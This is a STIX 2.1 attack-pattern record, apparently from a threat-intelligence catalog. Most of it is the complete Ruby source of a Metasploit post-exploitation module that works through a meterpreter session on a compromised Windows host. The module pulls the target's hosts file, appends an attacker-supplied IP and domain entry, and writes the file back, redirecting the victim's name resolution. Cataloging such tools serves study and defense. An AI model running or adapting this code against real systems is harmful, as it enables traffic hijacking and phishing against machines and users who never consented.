{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4bd90e91-3423-4ae4-9828-57fe5f0846ed",
    "created": "2024-08-14T16:33:04.970818Z",
    "modified": "2024-08-14T16:33:04.970822Z",
    "name": "Windows Manage Hosts File Injection",
    "description": " This module allows the attacker to insert a new entry into the target system's hosts file.  'License' => BSD_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/post/windows/manage/inject_host.rb",
            "external_id": "inject_host.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nrequire 'English'\nclass MetasploitModule < Msf::Post\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Windows Manage Hosts File Injection',\n        'Description' => %q{\n          This module allows the attacker to insert a new entry into the target\n          system's hosts file.\n        },\n        'License' => BSD_LICENSE,\n        'Author' => [ 'vt <nick.freeman[at]security-assessment.com>'],\n        'Platform' => [ 'win' ],\n        'SessionTypes' => [ 'meterpreter' ],\n        'Compat' => {\n          'Meterpreter' => {\n            'Commands' => %w[\n              core_channel_close\n              core_channel_eof\n              core_channel_open\n              core_channel_read\n              core_channel_tell\n              core_channel_write\n              stdapi_fs_stat\n            ]\n          }\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('DOMAIN', [ true, 'Domain name for host file manipulation.' ]),\n        OptString.new('IP', [ true, 'IP address to point domain name to.' ])\n      ]\n    )\n  end\n\n  def run\n    if datastore['IP'].nil? || datastore['DOMAIN'].nil?\n      print_error('Please specify both DOMAIN and IP')\n      return\n    end\n\n    ip = datastore['IP']\n    hostname = datastore['DOMAIN']\n\n    # Get a temporary file path\n    meterp_temp = Tempfile.new('meterp')\n    meterp_temp.binmode\n    temp_path = meterp_temp.path\n\n    begin\n      # Download the remote file to the temporary file\n      client.fs.file.download_file(temp_path, 'C:\\\\WINDOWS\\\\System32\\\\drivers\\\\etc\\\\hosts')\n    rescue Rex::Post::Meterpreter::RequestError => e\n      # If the file doesn't exist, then it's okay.  Otherwise, throw the\n      # error.\n      if e.result != 2\n        raise $ERROR_INFO\n      end\n    end\n\n    print_status(\"Inserting hosts file entry pointing #{hostname} to #{ip}..\")\n    hostsfile = ::File.open(temp_path, 'ab')\n    hostsfile.write(\"\\r\\n#{ip}\\t#{hostname}\")\n    hostsfile.close\n\n    client.fs.file.upload_file('C:\\\\WINDOWS\\\\System32\\\\drivers\\\\etc\\\\hosts', temp_path)\n    print_good('Done!')\n  end\nend\n",
    "x_mitre_platforms": [
        "[ 'win' ]"
    ]
}